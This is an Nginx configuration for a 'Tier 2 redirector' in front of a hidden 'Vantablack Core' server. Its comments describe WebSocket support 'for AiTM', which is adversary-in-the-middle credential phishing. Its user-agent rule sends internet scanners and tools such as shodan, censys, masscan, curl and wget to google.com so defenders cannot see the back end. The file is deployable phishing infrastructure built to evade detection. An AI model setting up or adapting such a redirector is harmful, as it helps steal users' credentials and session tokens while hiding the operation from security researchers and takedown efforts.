# Vantablack Tier 2 Redirector Configuration
# ==========================================
# This Nginx configuration acts as a "dumb proxy" or "smart filter" depending on deployment.
# It sits between the target/internet and the Vantablack Core (Tier 3).

user nginx;
worker_processes auto;
error_log /var/log/nginx/error.log warn;
pid /var/run/nginx.pid;

events {
    worker_connections 1024;
}

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';

    access_log /var/log/nginx/access.log main;

    sendfile on;
    keepalive_timeout 65;

    # --- Security Headers ---
    # Hide Nginx version
    server_tokens off;

    # --- Upstream Core (Tier 3) ---
    # Replace CORE_IP with the actual IP/Hostname of the Vantablack Core
    # or use a variable/environment variable if using Docker/OpenResty
    upstream vantablack_core {
        server CORE_HOST:CORE_PORT;
        keepalive 32;
    }

    server {
        listen 80;
        server_name _;

        # --- Basic Bot Filtering (Tier 2 Level) ---
        # Blocks obvious scanners before they hit the Core
        if ($http_user_agent ~* (curl|wget|python|java|go-http-client|censys|shodan|masscan)) {
            return 302 https://www.google.com;
        }

        # --- Proxy Configuration ---
        location / {
            proxy_pass http://vantablack_core;
            
            # Forward headers
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;

            # WebSocket Support (for AiTM)
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";

            # Timeouts
            proxy_read_timeout 90;
            proxy_connect_timeout 90;
        }

        # Health Check Endpoint (Local only)
        location /health {
            access_log off;
            allow 127.0.0.1;
            deny all;
            return 200 "OK";
        }
    }
}
